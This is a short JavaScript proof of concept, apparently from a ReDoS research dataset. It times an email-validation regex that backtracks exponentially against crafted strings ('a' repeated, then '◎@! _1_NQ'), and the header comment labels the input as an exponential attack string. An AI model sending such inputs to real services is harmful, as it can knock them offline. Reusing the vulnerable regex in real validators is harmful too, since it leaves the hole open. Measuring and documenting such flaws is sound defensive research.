/* 6882
 * ^\+?[a-z0-9](([-+.]|[_]+)?[a-z0-9]+)*@([a-z0-9]+(\.|\-))+[a-z]{2,6}$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"a"+"a"*32+"◎@! _1_NQ"
 */
var REGEX = /^\+?[a-z0-9](([-+.]|[_]+)?[a-z0-9]+)*@([a-z0-9]+(\.|\-))+[a-z]{2,6}$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'a' + 'a'.repeat(i*1) + '◎@! _1_NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}